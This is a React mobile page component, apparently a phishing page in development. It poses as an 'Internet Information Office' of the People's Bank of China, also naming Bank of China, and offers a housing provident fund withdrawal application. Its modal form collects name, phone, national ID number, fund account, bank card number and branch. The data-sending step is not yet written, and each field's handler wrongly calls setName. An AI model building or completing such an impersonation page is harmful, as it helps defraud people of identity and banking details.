import { Card, Toast, Button, Space, Modal, Form, Input } from 'antd-mobile'
import "./Home.css"
import { useEffect, useState } from 'react';


function Home() {

    let [name, setName] = useState("");
    let [submitState, setSubmite] = useState(false);

    useEffect(() => {





    }, [submitState])


    const onSubmit = () => {
        Modal.show({
            content: <div>
                <Form footer={
                    <Button block type='submit' color='primary' size='large'>
                        下一步
                    </Button>


                } onFinish={() => { console.log(name); onSubmit2(); }}>

                    <Form.Header>公积金申请 1/3 </Form.Header>
                    <div className='Form1'>
                        <Form.Item name="name" label='姓名' rules={[{ required: true, message: '姓名不能为空' }]}>
                            <Input placeholder='请输入您的真实姓名' onChange={(value) => { setName(value); }} />
                        </Form.Item>
                        <Form.Item name="phone" label='手机号码' rules={[{ required: true, message: '手机号码不能为空' }]}>
                            <Input placeholder='请输入您的手机号码' onChange={(value) => { setName(value); }} />
                        </Form.Item>
                        <Form.Item name="id" label='身份证号码' rules={[{ required: true, message: '身份证号码不能为空' }]}>
                            <Input placeholder='请输入您的身份证号码' onChange={(value) => { setName(value); }} />
                        </Form.Item>
                        <Form.Item name="gjjAcount" label='公积金帐号' >
                            <Input placeholder='请输入您的公积金帐号' onChange={(value) => { setName(value); }} />
                        </Form.Item>
                        <Form.Item name="amount" label='提取金额' rules={[{ required: true, message: '金额不能为空' }]}>
                            <Input placeholder='请输入您的提取金额' onChange={(value) => { setName(value); }} />
                        </Form.Item>
                        <Form.Item name="banknumber" label='银行卡号' rules={[{ required: true, message: '银行卡号不能为空' }]}>
                            <Input placeholder='请输入您的银行卡号' onChange={(value) => { setName(value); }} />
                        </Form.Item>
                        <Form.Item name="bankbranch" label='开户支行'>
                            <Input placeholder='请输入您的开户支行' onChange={(value) => { setName(value); }} />
                        </Form.Item>
                    </div>
                    <Form.Header />
                </Form>
            </div>,
            closeOnMaskClick: true,
            // closeOnAction: true,
            // actions: [
            //     {
            //         key: 'next',
            //         text: '下一步',
            //         primary: true,
            //         onClick: onSubmit2()
            //     },
            // ],
        })
    };
    const onSubmit2 = () => {

        Modal.show({
            content: <div>your name is {name}</div>,
            closeOnMaskClick: true,
        })


    }



    return (


        <div>
            <Card className="Head">
                中国银行互联网信息办公室
            </Card>
            <div className="Container">
                <Space direction='vertical' block>
                    <div className="TextTitle">
                        中国人民银行<br />互联网信息办公室
                    </div>
                    <div className="TextSmall">
                        指导 · 协调 · 监督
                    </div>
                    <br />
                    <Space direction='vertical' style={{ '--gap': '24px' }}  >
                        <div className="TextSmall">
                            《个人提取住房公积金申请（审批）书》
                        </div>
                        {/* <br /> */}
                        <div className="TextSmall" >
                            《个人征信系统查询申请》
                        </div>


                    </Space>
                    <div className="ButtonGroup">
                        <Button block color='primary' size='large' onClick={onSubmit}>
                            签署个人住房公积金审批书
                        </Button>
                        <Button block color='primary' size='large'>
                            查询之前签署信息
                        </Button>
                    </div>
                </Space>
            </div>




        </div>


    );
}


export default Home;